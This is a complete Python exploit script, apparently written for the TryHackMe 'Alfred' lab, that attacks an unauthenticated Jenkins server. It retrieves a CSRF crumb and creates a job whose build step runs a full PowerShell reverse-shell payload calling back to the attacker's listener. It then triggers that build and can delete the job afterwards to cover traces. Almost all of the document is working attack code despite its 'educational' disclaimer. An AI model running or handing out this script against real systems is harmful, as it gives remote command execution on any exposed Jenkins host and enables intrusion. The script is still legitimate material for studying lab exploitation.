#!/usr/bin/env python3
"""
TryHackMe Alfred - Jenkins Exploitation Script
Author: CTF Solutions
Date: September 2025

Description:
This script demonstrates automated exploitation of the TryHackMe Alfred challenge.
It targets an unauthenticated Jenkins instance to gain initial access and execute
payloads on the target Windows system.

Usage:
    python3 exploit.py <target_ip> <local_ip> <local_port>

Example:
    python3 exploit.py 10.10.10.123 10.8.0.100 4444

Requirements:
    - requests library (pip install requests)
    - netcat listener ready on specified port
    - Target Jenkins server accessible on port 8080

Warning:
    This script is for educational purposes only. Only use on systems you own
    or have explicit permission to test.
"""

import requests
import sys
import time
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings for cleaner output
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class AlfredExploit:
    def __init__(self, target_ip, local_ip, local_port):
        self.target_ip = target_ip
        self.local_ip = local_ip
        self.local_port = local_port
        self.jenkins_url = f"http://{target_ip}:8080"
        self.session = requests.Session()
        self.session.verify = False
        
        # Headers to mimic browser behavior
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def banner(self):
        print("="*60)
        print("    TryHackMe Alfred - Jenkins Exploitation Script")
        print("    Educational Use Only - CTF Solutions")
        print("="*60)
        print(f"Target: {self.target_ip}:8080")
        print(f"Listener: {self.local_ip}:{self.local_port}")
        print("="*60)
    
    def check_jenkins(self):
        """Check if Jenkins is accessible and unauthenticated"""
        try:
            print("[+] Checking Jenkins accessibility...")
            response = self.session.get(self.jenkins_url, timeout=10)
            
            if response.status_code == 200:
                if "Jenkins" in response.text and "Dashboard" in response.text:
                    print("[+] Jenkins is accessible and appears unauthenticated!")
                    return True
                else:
                    print("[-] Jenkins found but may require authentication")
                    return False
            else:
                print(f"[-] Jenkins not accessible (Status: {response.status_code})")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Error connecting to Jenkins: {e}")
            return False
    
    def get_crumb(self):
        """Get Jenkins CSRF crumb if required"""
        try:
            crumb_url = f"{self.jenkins_url}/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,'%3A',//crumb)"
            response = self.session.get(crumb_url)
            
            if response.status_code == 200 and ":" in response.text:
                field, crumb = response.text.split(":")
                print(f"[+] Retrieved CSRF crumb: {crumb[:20]}...")
                return {field: crumb}
            else:
                print("[*] No CSRF protection detected")
                return {}
                
        except Exception as e:
            print(f"[*] Could not retrieve crumb: {e}")
            return {}
    
    def create_job(self, job_name="pwn_job"):
        """Create a new Jenkins job with malicious build configuration"""
        try:
            print(f"[+] Creating malicious Jenkins job: {job_name}")
            
            # Get CSRF crumb
            crumb_data = self.get_crumb()
            
            # PowerShell reverse shell payload
            ps_payload = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{self.local_ip}',{self.local_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
            
            # XML configuration for freestyle project
            job_config = f"""
            <?xml version='1.1' encoding='UTF-8'?>
            <project>
                <actions/>
                <description>Automated exploit job - Educational purposes only</description>
                <keepDependencies>false</keepDependencies>
                <properties/>
                <scm class="hudson.scm.NullSCM"/>
                <canRoam>true</canRoam>
                <disabled>false</disabled>
                <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
                <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
                <triggers/>
                <concurrentBuild>false</concurrentBuild>
                <builders>
                    <hudson.tasks.BatchFile>
                        <command>{ps_payload}</command>
                        <configuredLocalRules/>
                    </hudson.tasks.BatchFile>
                </builders>
                <publishers/>
                <buildWrappers/>
            </project>
            """
            
            # Create job endpoint
            create_url = f"{self.jenkins_url}/createItem?name={job_name}"
            
            headers = {
                'Content-Type': 'application/xml',
                **crumb_data
            }
            
            response = self.session.post(
                create_url,
                data=job_config,
                headers=headers,
                timeout=10
            )
            
            if response.status_code in [200, 302]:
                print(f"[+] Successfully created job: {job_name}")
                return True
            else:
                print(f"[-] Failed to create job (Status: {response.status_code})")
                print(f"Response: {response.text[:200]}...")
                return False
                
        except Exception as e:
            print(f"[-] Error creating job: {e}")
            return False
    
    def trigger_build(self, job_name="pwn_job"):
        """Trigger the malicious job to execute payload"""
        try:
            print(f"[+] Triggering build for job: {job_name}")
            print(f"[!] Make sure your netcat listener is ready: nc -lvnp {self.local_port}")
            
            # Get CSRF crumb
            crumb_data = self.get_crumb()
            
            # Build trigger endpoint
            build_url = f"{self.jenkins_url}/job/{job_name}/build"
            
            headers = {**crumb_data}
            
            response = self.session.post(
                build_url,
                headers=headers,
                timeout=10
            )
            
            if response.status_code in [200, 201, 302]:
                print("[+] Build triggered successfully!")
                print("[*] Payload should be executing on target...")
                print(f"[*] Check your netcat listener on {self.local_ip}:{self.local_port}")
                return True
            else:
                print(f"[-] Failed to trigger build (Status: {response.status_code})")
                return False
                
        except Exception as e:
            print(f"[-] Error triggering build: {e}")
            return False
    
    def cleanup_job(self, job_name="pwn_job"):
        """Optional: Remove the malicious job after exploitation"""
        try:
            print(f"[*] Cleaning up job: {job_name}")
            
            # Get CSRF crumb
            crumb_data = self.get_crumb()
            
            delete_url = f"{self.jenkins_url}/job/{job_name}/doDelete"
            
            headers = {**crumb_data}
            
            response = self.session.post(
                delete_url,
                headers=headers,
                timeout=10
            )
            
            if response.status_code in [200, 302]:
                print("[+] Job cleaned up successfully")
            else:
                print("[-] Could not clean up job (manual cleanup may be required)")
                
        except Exception as e:
            print(f"[*] Cleanup error (not critical): {e}")
    
    def exploit(self):
        """Main exploitation workflow"""
        self.banner()
        
        # Step 1: Check Jenkins accessibility
        if not self.check_jenkins():
            print("[-] Exploitation failed: Jenkins not accessible")
            return False
        
        print("\n[*] Starting exploitation workflow...")
        
        # Step 2: Create malicious job
        if not self.create_job():
            print("[-] Exploitation failed: Could not create job")
            return False
        
        # Small delay to ensure job creation
        time.sleep(2)
        
        # Step 3: Trigger payload execution
        if not self.trigger_build():
            print("[-] Exploitation failed: Could not trigger build")
            return False
        
        print("\n[+] Exploitation completed!")
        print("[*] If successful, you should have a reverse shell connection")
        print("[*] Use 'whoami' to check your access level")
        print("[*] Look for privilege escalation opportunities")
        
        return True

def print_usage():
    print("Usage: python3 exploit.py <target_ip> <local_ip> <local_port>")
    print("")
    print("Arguments:")
    print("  target_ip   - IP address of the target Jenkins server")
    print("  local_ip    - Your local IP address for reverse shell")
    print("  local_port  - Local port for reverse shell listener")
    print("")
    print("Example:")
    print("  python3 exploit.py 10.10.10.123 10.8.0.100 4444")
    print("")
    print("Prerequisites:")
    print("  1. Start netcat listener: nc -lvnp <local_port>")
    print("  2. Ensure target Jenkins is accessible on port 8080")
    print("  3. Verify network connectivity to target")

def main():
    # Banner
    print("TryHackMe Alfred Exploitation Script")
    print("Educational Use Only - CTF Solutions\n")
    
    # Check arguments
    if len(sys.argv) != 4:
        print_usage()
        sys.exit(1)
    
    target_ip = sys.argv[1]
    local_ip = sys.argv[2]
    
    try:
        local_port = int(sys.argv[3])
        if not (1 <= local_port <= 65535):
            raise ValueError("Port must be between 1 and 65535")
    except ValueError as e:
        print(f"[-] Invalid port: {e}")
        sys.exit(1)
    
    # Validate IP format (basic check)
    def is_valid_ip(ip):
        try:
            parts = ip.split('.')
            return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
        except:
            return False
    
    if not is_valid_ip(target_ip):
        print("[-] Invalid target IP address")
        sys.exit(1)
    
    if not is_valid_ip(local_ip):
        print("[-] Invalid local IP address")
        sys.exit(1)
    
    # Create exploit instance and run
    exploit = AlfredExploit(target_ip, local_ip, local_port)
    
    try:
        success = exploit.exploit()
        
        if success:
            print("\n[+] Exploitation workflow completed successfully!")
            print("[*] Check your netcat listener for incoming connection")
        else:
            print("\n[-] Exploitation failed. Check target accessibility and try again")
            
    except KeyboardInterrupt:
        print("\n[-] Exploitation interrupted by user")
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        print("[*] Enable verbose mode for debugging if available")

if __name__ == "__main__":
    main()
